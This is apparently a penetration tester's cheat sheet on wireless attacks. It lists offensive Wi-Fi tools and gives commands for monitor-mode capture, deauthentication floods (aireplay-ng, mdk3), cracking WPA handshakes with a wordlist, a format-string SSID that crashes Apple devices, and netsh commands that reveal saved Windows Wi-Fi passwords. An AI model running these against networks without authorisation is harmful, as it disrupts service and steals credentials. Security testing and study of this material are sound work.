# Wireless Attacks

- [Resources](#resources)

## Table of Contents

- [Aircrack-ng](#aircrack-ng)
- [airodump-ng](#airodump-ng)
- [airmon-ng](#airmon-ng)
- [ALFA AWUS036ACH](#alfa-awus036ach)
- [Apple Wi-Fi Evil SSID](#apple-wi-fi-evil-ssid)
- [mdk3](#mdk3)
- [Microsoft Windows](#microsoft-windows)
- [Wi-Fi Example Attack](#wi-fi-example-attack)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Aircrack-ng | WiFi security auditing tools suite | https://github.com/aircrack-ng/aircrack-ng |
| airgeddon | This is a multi-use bash script for Linux systems to audit wireless networks. | https://github.com/v1s1t0r1sh3r3/airgeddon |
| AngryOxide | 802.11 Attack Tool | https://github.com/Ragnt/AngryOxide |
| EAPHammer | EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. | https://github.com/s0lst1c3/eaphammer |
| Flipper | Playground (and dump) of stuff I make or modify for the Flipper Zero | https://github.com/UberGuidoZ/Flipper |
| flipperzero-firmware | Flipper Zero Code-Grabber Firmware | https://github.com/Eng1n33r/flipperzero-firmware |
| flipperzero-firmware-wPlugins | Flipper Zero FW [ROGUEMASTER] | https://github.com/RogueMaster/flipperzero-firmware-wPlugins |
| JackIt | JackIt - Exploit Code for Mousejack Resources | https://github.com/insecurityofthings/jackit |
| OneShot | Run WPS PIN attacks (Pixie Dust, online bruteforce, PIN prediction) without monitor mode with the wpa_supplicant | https://github.com/kimocoder/OneShot |
| Pwnagotchi | (⌐■_■) - Deep Reinforcement Learning instrumenting bettercap for WiFi pwning. | https://github.com/evilsocket/pwnagotchi |
| WEF | A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, bluetooth hacking and much more. | https://github.com/D3Ext/WEF |
| Wifite | This repo is a complete re-write of wifite, a Python script for auditing wireless networks. | https://github.com/derv82/wifite2 |

## Aircrack-ng

```console
$ tshark -F pcap -r <FILE>.pcapng -w <FILE>.pcap
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt <FILE>.pcap
```

## airodump-ng

```console
$ sudo airodump-ng <INTERFACE>mon
```

## airmon-ng

```console
$ sudo airmon-ng check kill
$ sudo airmon-ng start <INTERFACE>
$ sudo airmon-ng stop <INTERFACE>
```

## ALFA AWUS036ACH

```console
$ sudo apt-get install realtek-rtl88xxau-dkms
```

## Apple Wi-Fi Evil SSID

```console
%p%s%s%s%s%n
```

## iw

```console
$ iwconfig
$ iw <INTERFACE> scan
```

## mdk3

> https://github.com/charlesxsh/mdk3-master

```console
$ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
$ sudo mdk3 <INTERFACE>mon d <BSSID>
$ sudo mdk3 <INTERFACE>mon b <BSSID>
```

## Microsoft Windows

### Wireless Profiles

#### List Profiles

```cmd
PS C:\> netsh wlan show profiles
```

#### Extract Passwords

```cmd
PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
```

#### Export Profiles

```cmd
PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
```

## Wi-Fi Example Attack

```console
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -w <FILE> -c <CHANNEL> --bssid <BSSID> wlan0mon
```

```console
$ sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

```console
$ aircrack-ng <FILE>.cap -w /usr/share/wordlists/rockyou.txt
```

```console
$ sudo airmon-ng stop wlan0mon
```

## wpa_supplicant

### wpa_supplicant.conf

```console
$ echo 'ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network={
    ssid="<SSID>"
    psk="<PSK>"
}' > /etc/wpa_supplicant.conf
```

```console
$ wpa_supplicant -B -D wext -i <INTERFACE> -c /etc/wpa_supplicant.conf
```

```console
$ ip link set <INTERFACE> up
```

```console
$ dhclient -h
```
